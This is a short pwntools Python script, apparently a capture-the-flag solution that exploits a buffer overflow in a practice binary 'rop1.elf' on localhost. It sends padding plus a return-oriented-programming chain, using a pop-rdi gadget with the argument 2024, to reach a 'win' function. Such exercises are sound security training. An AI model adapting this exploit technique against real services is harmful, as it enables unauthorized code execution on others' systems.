import pwn

PORT=5000
HOST='localhost'

pwn.context.arch = 'x86-64'

addr = {}
elf = pwn.ELF('./rop1.elf')
addr['win'] = elf.symbols['win'] + 5
addr['pop_rdi_ret'] = 0x000000000040121e
addr['ret'] = 0x000000000040101a

def exploit():
    io = pwn.remote(host=HOST,port=PORT)

    recv = io.recv(1024)
    print(f'recv = {recv}')

    payload = pwn.flat(
        b'A' * 0x20,

        pwn.pack(0),
        pwn.pack(addr['pop_rdi_ret']),

        pwn.pack(2024),
        pwn.pack(addr['win']),

        b'\n'
    )

    print(f"payload = {payload}")
    io.send(payload)

    recv = io.recvrepeat(1)
    print(f'recv = {recv}')

    

if(__name__=='__main__'):
    exploit()